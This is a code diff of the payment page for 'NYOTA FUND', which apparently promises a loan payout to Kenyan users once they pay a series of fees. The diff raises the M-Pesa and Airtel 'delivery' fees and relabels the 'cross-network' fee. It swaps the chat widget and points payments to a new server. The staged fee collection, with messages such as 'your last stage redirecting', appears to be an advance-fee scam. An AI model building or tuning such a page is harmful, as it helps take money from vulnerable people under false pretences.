@@ -1,21 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
- <!-- Brevo Conversations {literal} -->
-<!-- Brevo Conversations {literal} -->
-<script>
-    (function(d, w, c) {
-        w.BrevoConversationsID = '6983ee73ee85d98dd40c3361';
-        w[c] = w[c] || function() {
-            (w[c].q = w[c].q || []).push(arguments);
-        };
-        var s = d.createElement('script');
-        s.async = true;
-        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
-        if (d.head) d.head.appendChild(s);
-    })(document, window, 'BrevoConversations');
-</script>
-<!-- /Brevo Conversations {/literal} -->
-<!-- /Brevo Conversations {/literal} -->
+<!-- Removed Brevo Conversations code for LiveChat widget -->
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -103,8 +88,7 @@ if(!localStorage.getItem("payment1Completed")){
 
   <!-- CONFIRMATION -->
   <div class="notice">
-    ✅ Processing fee confirmed. Please  choose where you  will receive your Funds, Remember you have to pay cross-network fee to
-    complete your payout.
+    ✅ Processing Fee confirmed. What remains is for you to choose  your preferred delivery option:
   </div>
 
   <p style="font-size:18px;font-weight:bold;">
@@ -117,9 +101,8 @@ if(!localStorage.getItem("payment1Completed")){
 
     <select id="paymentMethod" required>
       <option value="">-- Choose Network --</option>
-      <option value="mpesa">Safaricom M-Pesa (Ksh 390)</option>
-      <option value="airtel">Airtel Money (Ksh 395)</option>
-      <option value="bank">Bank Account (Ksh 460)</option>
+      <option value="mpesa">Safaricom M-Pesa (Ksh 520)</option>
+      <option value="airtel">Airtel Money (Ksh550)</option>
     </select>
 
     <p style="margin-top:10px;">
@@ -150,6 +133,16 @@ if(!localStorage.getItem("payment1Completed")){
     <button onclick="popupOk()" id="popupBtn" style="display:none;">OK</button>
   </div>
 </div>
+
+<!-- LiveChat Widget -->
+<script>
+  window.__lc = window.__lc || {};
+  window.__lc.license = 19513072; // Your LiveChat license ID
+  window.__lc.integration_name = "manual_channels";
+  window.__lc.product_name = "livechat";
+  (function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
+</script>
+<noscript><a href="https://www.livechat.com/chat-with/19513072/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
 
 <script>
  // ===== LOAD USER NAME FROM LOCAL STORAGE (CAPITAL) =====
@@ -195,7 +188,7 @@ if(!fund || !fund.amount){
 }
 
 /* Fees */
-const fees = { mpesa:390, airtel:395, bank:460 };
+const fees = { mpesa:520, airtel:550 };
 paymentMethod.addEventListener('change', () => {
   methodFee.innerText = fees[paymentMethod.value] || '---';
 });
@@ -253,7 +246,7 @@ payment2Form.addEventListener('submit', async (e) => {
 
   let data = null;
   try{
-    const res = await fetch("https://nyotafund-server-1.onrender.com/", {
+    const res = await fetch("https://nyota-server-collins.onrender.com/pay", {
       method: "POST",
       headers: {"Content-Type":"application/json"},
       body: JSON.stringify({ phone: phoneVal, amount, loan_amount: fund.amount })
@@ -307,7 +300,7 @@ function pollReceipt(ref, method, amount){
     }
 
     try{
-      const r = await fetch(`https://nyotafund-server-1.onrender.com//${encodeURIComponent(ref)}`, { cache: "no-store" });
+      const r = await fetch(`https://nyota-server-collins.onrender.com/receipt/${encodeURIComponent(ref)}`, { cache: "no-store" });
       if(!r.ok){
         console.warn('Receipt fetch not ok', r.status);
         return;
@@ -322,7 +315,7 @@ function pollReceipt(ref, method, amount){
           try{ localStorage.setItem("payment2Completed", "yes"); }catch(e){}
           showPopup(
             "Payment Successful ✅",
-            "Your network fee has been received. Your NYOTA FUND is now pending released.your last stage redirecting.....",
+            "Your Delivery fee has been received. Your NYOTA FUND is now pending released.your last stage redirecting.....",
             false,
             false
           );
@@ -341,4 +334,4 @@ function pollReceipt(ref, method, amount){
 </script>
 
 </body>
-</html>
+ </html>
